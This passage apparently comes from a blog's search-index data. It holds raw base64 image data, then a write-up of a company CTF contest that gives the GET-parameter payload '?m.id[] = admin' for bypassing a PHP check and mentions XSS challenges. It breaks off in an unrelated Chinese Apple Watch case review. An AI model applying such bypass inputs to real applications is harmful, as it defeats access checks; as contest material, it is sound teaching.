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```markdownFrom the beginning, we can tell that this is a base64 compressed image. By pasting the above encoding directly into the browser's address bar, we can obtain the URL where the answer is located. Once we enter the URL, we can proceed!![](/assets/729d7b6817a4/1*6u6ZvakGMLy6KXmJYaPKNw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NzMiIGhlaWdodD0iMTg2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }**4\\. Breaking Through the Blockade**![](/assets/729d7b6817a4/1*E_O7Tn8D02fGIoJ4emWhmw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NTYiIGhlaWdodD0iMzYyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }**Problem Description:** Upon opening this problem, it directly displays the PHP code for the question. We need to find a way to bypass the judgment using GET parameters to execute the `setPassedCookie();` method inside the else statement.Solution: This problem involves a commonly used but little-known PHP vulnerability, which is detailed below:![[Summary of Common PHP Vulnerabilities in CTF](https://xz.aliyun.com/t/3085){:target=\"_blank\"}](/assets/729d7b6817a4/1*iITV3WJTJHez1xRpul6uTA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3ODciIGhlaWdodD0iNzM1Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }[Summary of Common PHP Vulnerabilities in CTF](https://xz.aliyun.com/t/3085){:target=\"_blank\"}The problem has been slightly modified, and the answer to this question is: `?m.id[] = admin`**5\\. The Test of Penetration, 6\\. The Test of Penetration 2**These two questions are basic entry-level XSS problems, so I won't elaborate further.For this question, since I placed the answer on the frontend, I used a JS website that provides irreversible encryption: [https://www\\.sojson\\.com/jsobfuscator\\.html](https://www.sojson.com/jsobfuscator.html){:target=\"_blank\"}(Although I'm not sure if it's true? Anyway, if there's a way to crack it, let's consider it passed!)**7\\. Moonlight Treasure Box**This question is pulled from a puzzle-solving app, and I won't showcase it here.### SummaryThe competition system took about a week to build, and the questions took about three months to gradually piece together (it requires inspiration); the competition has successfully concluded, and the feedback received has been quite positive—\"fun and enjoyable\"; this was also my original intention, hoping everyone explores and brainstorms from a fun perspective. Therefore, regardless of the question titles (which are all movie-related) or the direction of the questions, there won't be anything too deep in engineering or calculations, as that would be too dull and uninteresting!Additionally, here is the question response rate, which serves as a reference for difficulty:![](/assets/729d7b6817a4/1*-ViR_TfrzhANOFymo1eVoA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MDMiIGhlaWdodD0iMzA1Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }When I was creating the questions, my biggest fear was that they would be too easy and everyone would solve them quickly, or too difficult and everyone would get stuck—both situations are quite awkward.The actual results of the questions in the competition (competition time: 90 minutes) met our expectations, just right! Not too difficult or too easy; the first-place team solved 9 questions, and even the last-place team solved 7 questions; very close, but due to time scoring and purchased hints, the final ranking was still determined!&gt; Surprisingly, no one managed to solve the door to the magic academy… QQThis concludes the summary of the engineering CTF competition.![Addcn 2019 CTF](/assets/729d7b6817a4/1*M8l9fhtOUNtU0NgTHfvGrA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjkwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Addcn 2019 CTF### Further Reading- [Revealing a Clever Website Vulnerability Discovered a Few Years Ago](/posts/zrealm-dev/en/revealing-a-clever-website-vulnerability-discovered-a-few-years-ago-142244e5f07a/)- [The APP Uses HTTPS for Transmission, but Data Still Got Stolen](/posts/zrealm-dev/en/the-app-uses-https-for-transmission-but-data-still-gets-stolen-46410aaada00/)If you have any questions or suggestions, feel free to [contact me](https://www.zhgchg.li/contact){:target=\"_blank\"}.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 4,840 Total Views Last Statistics Date: 2025-08-15 | 4,720 Views on Medium." }, { "title": "Apple Watch 保護殼開箱體驗 (Catalyst & Muvit)", "url": "/posts/zrealm-life/apple-watch-%E4%BF%9D%E8%AD%B7%E6%AE%BC%E9%96%8B%E7%AE%B1%E9%AB%94%E9%A9%97-catalyst-muvit-a66ce3dc8bb9/", "categories": "ZRealm Life.", "tags": "生活, 開箱, 3c, apple-watch, catalyst", "date": "2019-07-08 22:55:50 +0800", "snippet": "Apple Watch 保護殼開箱體驗 (Catalyst &amp; Muvit)Catalyst Apple Watch 超輕薄防水保護殼 &amp; Muvit Apple Watch 保護套[最新更新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往 Apple Watch 原廠不鏽鋼米蘭錶帶開箱&gt;&gt;點我前往 感謝...", "content": "Apple Watch 保護殼開箱體驗 (Catalyst &amp; Muvit)Catalyst Apple Watch 超輕薄防水保護殼 &amp; Muvit Apple Watch 保護套[最新更新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往 Apple Watch 原廠不鏽鋼米蘭錶帶開箱&gt;&gt;點我前往 感謝 Men’s Game 玩物誌 提供 Apple Watch Series 4 保護殼試用。身為一個神經大條的強迫症患者，在使用Apple Watch這種精緻的產品非常困擾；因手殘神經大條很容易不小心碰撞到＆加上強迫症有傷痕用起來會很不爽，所以一買來就一直貼滿版保護貼防止意外發生．但其實 只貼滿版保護貼是不夠的，手錶本身是曲面，保護貼邊邊脆弱，很容易因本體邊框不小心擦到造成碎邊 ：無保護殼情況下，滿版保護貼碎邊慘況目前已換第三張滿版保護貼；雖然手錶本身螢幕沒有受傷但心還是很痛，完美貼合＋不影響觸控＋薄＋高透＋不掀邊＝很貴($990/張)，花在保護貼的$都快夠我直升不鏽鋼版了；也因此Apple Watch 的保護殼對我來說就非常重要，可以加強本體邊框的防護，減少碰撞受傷問題．本篇會開箱兩款Apple Watch 保護殼，並針對體驗心得、機能、外型、適用場景分別做出比較，讓我們開始吧！左：Muvit保護套/右：Catalyst保護殼(含錶帶)p.s. 我的手錶型號是：Apple Watch Series 4 (GPS + 行動網路)，44 公釐太空灰色鋁金屬錶殼搭配黑色運動型錶帶Catalyst Apple Watch 超輕薄防水保護殼(含錶帶)這款保護殼是有含錶帶的一體化設計，從佩戴到防撞防水的全方位保護．開箱使用：盒子正面100公尺防水/360°全方位防護/2公尺墜落防摔盒子背面IP-68防水級別，每件產品經水深一百米測試，美國軍規級碰撞保護，可直接操作屏幕，原聲通話品質，可經錶殼直接充電，可經錶殼直接偵測心跳率．IP-68 ( Wiki )：6 - 完全防塵灰塵無法進入，完全防止接觸。8 - 